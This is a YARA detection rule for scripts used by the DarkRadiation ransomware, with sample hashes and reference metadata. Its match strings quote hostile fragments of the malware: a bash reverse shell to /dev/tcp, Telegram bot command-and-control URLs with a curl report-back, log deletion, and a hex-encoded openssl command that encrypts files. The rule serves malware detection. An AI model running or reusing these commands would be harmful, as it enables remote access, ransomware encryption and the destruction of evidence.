rule ARKBIRD_SOLG_RAN_ELK_Darkradiation_Jul_2021_3: FILE {
  meta:
    description = "Detect structures of scripts like used by the DarkRadiation ransomware"
    author      = "Arkbird_SOLG"
    id          = "144eb08d-e222-5f6f-925d-33077953e7e6"
    date        = "2021-07-03"
    modified    = "2021-07-05"
    reference   = "https://bazaar.abuse.ch/browse/tag/DarkRadiation/"
    source_url  = "https://github.com/StrangerealIntel/DailyIOC/blob/a873ff1298c43705e9c67286f3014f4300dd04f7/2021-07-04/DarkRadiation/RAN_ELK_DarkRadiation_Jul_2021_3.yara#L1-L29"
    license_url = "N/A"
    logic_hash  = "8d2fa53f5abd327d100ffc71863f3b49ce8a19f1a72db556902d95ae6ba09d4a"
    score       = 75
    quality     = 55
    tags        = "FILE"
    hash1       = "bc6e4b879228c248b7ff9aebbf857e94354829a98b6aea9b1c187005cbc2e0d0"
    hash2       = "691afd4ef5f33d99053c57456ce9fa126e29d51d4dd510928193d8c3332547b1"
    hash3       = "fdd8c27495fbaa855603df4f774fe86bbc21743f59fd039f734feb07704805bd"
    tlp         = "White"
    adversary   = "FERRUM"

  strings:
    $s1 = "for file in `find / -name '*.sh' -type f -exec grep -l"
    $s2 = "rm -rf /var/log/yum*"
    $s3 = "if rpm -q openssl"
    $s4 = { 6f 70 65 6e 73 73 6c 20 65 6e 63 20 2d 61 65 73 2d 32 35 36 2d 63 62 63 20 2d 73 61 6c 74 20 2d 70 61 73 73 20 70 61 73 73 3a 24 50 41 53 53 20 2d 69 6e 20 24 66 69 6c 65 20 2d 6f 75 74 20 24 66 69 6c 65 2e e2 98 a2 }
    $x1 = "URL='https://api.telegram.org/bot'$TOKEN"
    $x2 = "MSG_URL=$URL'/sendMessage?chat_id='"
    $x3 = "UPD_URL=$URL'/getUpdates?offset='"
    $x4 = "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
    $x5 = "msg=\"[+] Shell Running.\""
    $x6 = "res=$(curl -s -X POST $MSG_URL -d chat_id=$ID_MSG -d text=\"DONE!!!\" &)"
    $y1 = "#!/bin/bash"
    $y2 = { 3b [2-5] 3d 27 [2-5] 27 3b [2-5] 3d 27 [2-5] 27 3b [2-5] 3d 27 [2-5] 27 3b [2-5] 3d 27 [2-5] 27 3b }
    $y3 = { 65 76 61 6c 20 22 24 [2-5] 24 [2-5] 24 [2-5] 24 }

  condition:
    filesize > 1KB and (3 of ($s*) or 5 of ($x*) or all of ($y*))
}